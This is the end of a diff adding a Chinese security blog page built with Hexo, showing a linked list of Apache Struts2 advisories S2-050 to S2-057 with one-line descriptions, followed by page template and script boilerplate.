+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-050">S2-050</a> - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044和S2-047）</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-051">S2-051</a> - 远程攻击者可能在使用Struts REST插件时通过发送精心设计的xml请求来创建DoS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-052">S2-052</a> - 使用带有XStream处理程序的Struts REST插件处理XML有效负载时可能发生的远程代码执行攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-053">S2-053</a> - 在Freemarker标记中使用无意表达而不是字符串文字时可能发生的远程执行代码攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-054">S2-054</a> - 使用Struts REST插件时，可以使用精心设计的JSON请求执行DoS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-055">S2-055</a> - Jackson JSON库中的RCE漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-056">S2-056</a> - 使用Struts REST插件时，可以使用精心设计的XML请求执行DoS攻击</li>
+<li><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-057">S2-057</a> - 当alwaysSelectFullNamespace为true（由用户或插件如Convention Plugin）时可能执行远程代码执行，然后：结果使用没有命名空间，同时，其上层包没有或通配符名称空间，类似于结果，当使用没有值和动作集的url标记时，它的上层包没有或通配符命名空间。</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Struts2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">Struts2、漏洞复现、代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/">
+                        <span class="hidden-mobile">ThinkPHP5漏洞分析之SQL注入六</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
